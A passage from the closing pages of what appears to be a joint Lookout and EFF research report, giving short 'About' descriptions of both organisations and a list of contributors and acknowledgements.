enterprises and \ngovernment agencies, and such ecosystem partners as AT&T, \nDeutsche Telekom, and Microsoft. Headquartered in San \nFrancisco, Lookout has offices in Amsterdam, Boston, London, \nSydney, Tokyo, Toronto and Washington, D.C.\nAbout EFF\nThe Electronic Frontier Foundation is the leading nonprofit \norganization defending civil liberties in the digital world. \nFounded in 1990, EFF champions user privacy, free expression, \nand innovation through impact litigation, policy analysis, \ngrassroots activism, and technology development. We work to \nensure that rights and freedoms are enhanced and protected as \nour use of technology grows.\nContributors\nAndrew Blaich, Lookout  \nApurva Kumar, Lookout Jeremy Richards, Lookout  \nMichael Flossman, Lookout  \n \nCooper Quintin, EFF \nEva Galperin, EFF\nSpecial thanks to the many others in our organization, and to our \npartners, who contributed significantly to this work."
}